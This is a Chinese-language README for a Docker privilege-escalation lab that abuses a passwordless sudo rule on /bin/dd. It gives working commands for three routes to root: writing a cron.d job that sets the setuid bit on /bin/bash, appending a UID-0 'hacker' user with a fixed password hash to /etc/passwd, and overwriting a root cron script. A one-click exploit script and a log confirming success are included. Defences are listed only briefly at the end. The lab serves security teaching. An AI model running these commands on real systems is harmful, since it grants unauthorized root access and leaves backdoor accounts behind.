# sudo dd 任意写提权（组合拳）

## 快速使用（一键利用）

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/sudo-dd-write
docker compose up -d --build
docker exec -it sudo-dd-write su - lowpriv   # 密码 lowpriv123
```

### 第二步：容器内确认漏洞环境

```bash
id
sudo -l
# 预期: (root) NOPASSWD: /bin/dd
ls -la /opt/exploits/
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 原理

管理员授权了 `lowpriv ALL=(root) NOPASSWD: /bin/dd`——dd 可以**以 root 身份向
任意文件写入/追加数据**（of= 指定目标，of= 覆盖、oflag=append 追加），没有 shell。
组合拳思路：

```
sudo dd (root 任意写)
  ├─ 拳法1: dd 写 /etc/cron.d/ 计划任务 -> cron 定时提权
  ├─ 拳法2: dd 追加 /etc/passwd -> UID=0 用户 -> su
  └─ 拳法3: dd 覆盖 backup.sh -> cron 执行恶意脚本
```

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：`lowpriv ALL=(root) NOPASSWD: /bin/dd`
- 预置场景：root 的 cron 每分钟执行 /usr/local/bin/backup.sh

## 手动利用（分步教学）

### 拳法 1：dd 写计划任务（最直接）

```bash
# 1. 用 sudo dd 写 /etc/cron.d/pwn (of= 覆盖写)
echo '* * * * * root chmod u+s /bin/bash' | sudo dd of=/etc/cron.d/pwn

# 2. 验证
cat /etc/cron.d/pwn

# 3. 等 1 分钟
sleep 65
/bin/bash -p -c 'id'     # euid=0(root) 提权成功
```

注意：dd 覆盖写要求目标存在或可创建——/etc/cron.d/pwn 不存在时 dd 会直接创建
（root 权限）。管道喂给 dd 的 stdin（if 缺省为 stdin）。

### 拳法 2：dd 追加 /etc/passwd

```bash
# 1. 生成哈希
openssl passwd -1 -salt hacker 123456
# 输出: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 2. 用 dd 追加 (oflag=append conv=notrunc 不截断)
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' | sudo dd of=/etc/passwd oflag=append conv=notrunc

# 3. 登录
echo 123456 | su hacker -c 'id'
# 预期: uid=0(root)
```

### 拳法 3：dd 覆盖 cron 脚本

```bash
# 构造恶意脚本
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/evil.sh

# dd 覆盖 (root 写, 目标已存在)
sudo dd if=/tmp/evil.sh of=/usr/local/bin/backup.sh

# 等 cron 执行
sleep 65 && /bin/bash -p -c 'id'
```

## 为什么能成功

| 环节 | 说明 |
|:---|:---|
| sudo dd | dd 以 euid=0 运行，of= 任意路径可写 |
| of= 覆盖 / oflag=append 追加 | 覆盖式写新文件或追加到现有文件 |
| 写 cron.d | cron 以 root 执行该目录任务（需 user 字段） |

## 防御

- 不授权 dd 的 sudo（dd 可写任意文件，等效 tee/cp）
- 若业务需要，限定参数或改用专用接口
- 监控系统关键文件与 cron 目录

## 扩展教学（网络搜索整理）

### dd 写文件参数速查

| 参数 | 作用 |
|:---|:---|
| `of=/路径` | 输出目标文件（覆盖） |
| `oflag=append` | 追加模式 |
| `conv=notrunc` | 不截断（配合追加） |
| `if=/文件` | 输入来源（默认 stdin） |
| `bs=1 count=N` | 按字节精确写入 |

### 隐蔽变体：精确覆盖

dd 支持按偏移写入（skip= 跳过输入、seek= 跳到输出偏移），可精确修改
文件中间内容（如替换 root 行的密码字段）：
```bash
# 找到 root 行哈希字段偏移后, dd 按偏移覆盖
# 示例: 覆盖 /etc/passwd 第 1 行第 6 个字节起的内容
```

### 同类组合拳总结

tee / cp / dd / install 四种"root 写文件无 shell"命令，组合目标一致：
cron.d、/etc/passwd、authorized_keys、可执行脚本。见 sudo-tee-write 的扩展教学。

## 验证记录

2026-08-26 实机验证：`echo '* * * * * root chmod u+s /bin/bash' | sudo dd of=/etc/cron.d/pwn` 写入后等待 65 秒，`/bin/bash -p -c 'id'` 输出 `euid=0(root)`，复现成功。
